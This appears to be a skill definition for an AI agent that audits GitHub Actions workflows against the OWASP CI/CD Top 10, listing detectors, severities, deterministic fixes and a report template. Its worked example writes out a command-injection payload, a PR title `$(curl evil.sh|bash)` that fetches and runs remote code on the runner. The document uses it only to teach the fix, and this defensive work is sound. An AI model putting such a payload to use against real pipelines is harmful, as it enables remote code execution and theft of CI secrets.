---
name: audit-github-actions-security
description: Audit GitHub Actions workflow files (.github/workflows/*.yml, composite/reusable actions) against the OWASP Top 10 CI/CD Security Risks (CICD-SEC-1..10) — script injection via untrusted ${{ github.event }} expansion, pull_request_target/workflow_run pwn-requests, mutable action pins, over-broad GITHUB_TOKEN permissions, long-lived secrets vs OIDC, exposed self-hosted runners, and the rest of the ten. Invoke when reviewing, hardening, or writing a GitHub Actions workflow or CI/CD pipeline config, or vetting a workflow before merge. Skip when scanning for literal hardcoded credentials or the agent's model-API key posture, wherever they live (use audit-secret-exposure), auditing an agent harness's output/dependency-install sinks (use audit-supply-chain-sinks), or auditing an agent's private-data x untrusted-input x egress architecture (use audit-lethal-trifecta).
user-invocable: true
version: "0.2.0"
usage: /audit-github-actions-security [path-to-workflow-or-repo]
---

# Audit GitHub Actions Security

A GitHub Actions workflow is privileged automation that runs on every push, PR, and comment — often
with write tokens and secrets in scope, sometimes on attacker-influenced input. This audit reads
workflow YAML and flags violations of the
**[OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)**
(CICD-SEC-1…10) plus the well-known GitHub-Actions-specific attack classes, mapping each finding to
its `CICD-SEC-N` category and the deterministic fix.

**Stance — detect and recommend against the OWASP CI/CD Top 10; read-only; change nothing without confirmation.**
- **Untrusted input never reaches a privileged runtime.** `${{ github.event.* }}`, `head_ref`, and PR
  titles/bodies/comments are attacker-controlled; expanded into a `run:` shell they are RCE on the
  runner (CICD-SEC-4) — bind them to an `env:` var and reference `"$VAR"`, never inline the expression.
- **Pin trust to an immutable ref.** A third-party `uses:` on a tag/branch is a mutable pointer the
  upstream can repoint into your token's blast radius — pin to a full 40-char commit SHA (CICD-SEC-3).
- **Least privilege is the default, not the exception.** Set a top-level `permissions: {}` and grant
  each job only what it needs; prefer OIDC over long-lived secrets (CICD-SEC-2/5/6). A `permissions:`
  block and a SHA pin are *deterministic* controls — they hold where a review comment does not.

## Input
- `path` (optional): a workflow file, a `.github/workflows/` dir, or a repo. Default — scan
  `.github/workflows/*.yml|*.yaml` plus any `action.yml`/`action.yaml` (composite/reusable actions),
  reading each trigger (`on:`), `permissions:`, `uses:` ref, `run:` body, `secrets`/`env` flow,
  `runs-on:`, and artifact/publish + logging config.

## Scope
Audits **CI/CD pipeline configuration** (GitHub Actions workflow + action YAML) against the OWASP CI/CD
Top 10. **Out of scope:** a literal hardcoded-credential content scan of an *agent's* context files
(→ `audit-secret-exposure`); an *agent harness's* output/dependency-install sinks
(→ `audit-supply-chain-sinks`); an *agent's* private-data × untrusted-input × egress architecture
(→ `audit-lethal-trifecta`); non-GitHub CI platforms (GitLab/Jenkins/CircleCI — same OWASP categories,
different syntax). It flags GitInject-class risk (untrusted PR content + elevated CI perms) as a
*workflow* defect; the agent-architecture form routes to `audit-lethal-trifecta`.

## Procedure
1. **Inventory.** List every workflow + action, its triggers, top-level and per-job `permissions:`,
   every `uses:` and its ref, every `run:` that interpolates `${{ … }}`, secret/OIDC usage, `runs-on:`,
   and artifact-publish + logging steps.
   Done when every workflow and action file is inventoried — none skipped.
2. **Run the detectors** in [`checks.md`](checks.md) (GHA-1…GHA-10), one pass per workflow.
   Done when every workflow × GHA check has a recorded verdict — no blanks.
3. **Classify severity.** Critical = attacker code/secret exfil on a privileged runtime (GHA-1 script
   injection, GHA-2 pwn-request, GHA-7 untrusted self-hosted runner). High = standing over-privilege or
   mutable-trust (GHA-3 unpinned, GHA-4 token scope, GHA-5 secret/OIDC, GHA-6 flow control). Medium =
   integrity/governance/visibility gaps (GHA-8, GHA-9, GHA-10).
   Done when every finding carries exactly one severity.
4. **Recommend the deterministic fix per finding** (the `checks.md` Fix column) — env-bound expression,
   full SHA pin, `permissions: {}`, OIDC, environment protection, ephemeral runner — preferring the
   config control the model can't override over a prose caveat.
   Done when every finding names its deterministic fix — no fix-less rows.
5. **Apply the precision guard (GHA-0).** Do **not** flag a workflow already hardened (SHA-pinned,
   least-privilege `permissions:`, no untrusted checkout under a privileged trigger, OIDC) — confirm
   what is clean. Read-only; apply nothing without confirmation.
   Done when every unflagged workflow is listed as clean or unverified.

## Checks
Ten detectors mapped to the OWASP CICD-SEC categories — GHA-1 script injection (SEC-4), GHA-2
pwn-request (SEC-4), GHA-3 unpinned actions (SEC-3/9), GHA-4 token least-privilege (SEC-2/5), GHA-5
credential hygiene/OIDC (SEC-6), GHA-6 flow control (SEC-1), GHA-7 runner isolation (SEC-7), GHA-8
3rd-party governance (SEC-8), GHA-9 artifact integrity (SEC-9), GHA-10 logging/visibility (SEC-10) —
each with Flags / Why→corpus(+OWASP/GitHub) / Fix→lesson, plus the GHA-0 precision guard, live in
[`checks.md`](checks.md), loaded when auditing.

## Worked example (GHA-1, the script-injection sink)
**Before:** `run: echo "Building PR ${{ github.event.pull_request.title }}"` — a PR titled
`$(curl evil.sh|bash)` executes on the runner. **Finding:** Critical, GHA-1 / CICD-SEC-4.
**After (the fix):** `env: { TITLE: ${{ github.event.pull_request.title }} }` then
`run: echo "Building PR $TITLE"` — the value is data in an env var, never expanded into the shell.

## Output template
```
# GitHub Actions security audit — <repo / workflow>
Workflows: <N> · OWASP basis: OWASP Top 10 CI/CD Security Risks (CICD-SEC-1..10)

## Findings
| Sev | Check | OWASP | Workflow:line | Flag | Deterministic fix |
|---|---|---|---|---|---|
| Critical | GHA-1 | SEC-4 | ci.yml:31 | PR title in `run:` shell | bind to `env:` var; reference `"$VAR"` |
| Critical | GHA-2 | SEC-4 | pr.yml:8  | `pull_request_target` checks out head + has secrets | split workflow; don't build untrusted code with secrets |
| High | GHA-3 | SEC-3 | ci.yml:14 | `uses: actions/checkout@v4` (mutable tag) | pin to full commit SHA; Dependabot |
| High | GHA-4 | SEC-5 | ci.yml:1  | no top-level `permissions:` (default broad) | `permissions: {}` top-level; least per job |

**Clean (precision guard):** <pinned/least-privilege/OIDC workflows that conform, and why.>
**Unverified — confirm in settings:** <settings-level conjuncts not visible in YAML (fork-approval posture, environment reviewers, repo visibility/runner config, audit-log retention — the GHA-6/7/10 dispositions); listed for follow-up via `gh api`, never graded pass/fail.>
**Highest-impact fix:** <the one change to make first.>
**Routed out:** <agent literal-secret scan → audit-secret-exposure; agent harness sinks → audit-supply-chain-sinks.>
```

## Related
- **`audit-secret-exposure`** — literal hardcoded-credential scan of an *agent's* context surfaces;
  this skill owns *workflow* credential-config risk (token scope, OIDC, secret-to-fork exposure).
- **`audit-supply-chain-sinks`** — *agent harness* output/install sinks; this skill flags workflow-level
  unpinned actions (GHA-3) and `curl|bash` (GHA-8) as CI config defects.
- OWASP: [Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/);
  GitHub: [Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions).

**Findings → backlog (default).** After the report, **offer** to file the findings as one tracking issue — interactive: recommend and confirm first (never auto-file); autonomous: self-file — shaped like `track-backlog` (title `<skill-name>: <one-line>`, label `enhancement`, body = the findings table). Each finding, in both the report **and** the filed issue, carries its **Fix → lesson** link — resolved by check ID via [`checks.md`](checks.md), which stays the link's canonical home (citation standard).

## Critical rules (read last)
- **Untrusted `${{ … }}` never inline in `run:`** — bind to `env:` (CICD-SEC-4). A privileged trigger
  (`pull_request_target`/`workflow_run`) must not build/checkout untrusted code with secrets in scope.
- **Pin third-party actions to a full commit SHA; set `permissions: {}` then grant least; prefer OIDC**
  — deterministic controls (CICD-SEC-2/3/5/6), not a review comment.
- Every finding cites its `CICD-SEC-N` category. Read-only — recommend; apply nothing without confirmation.
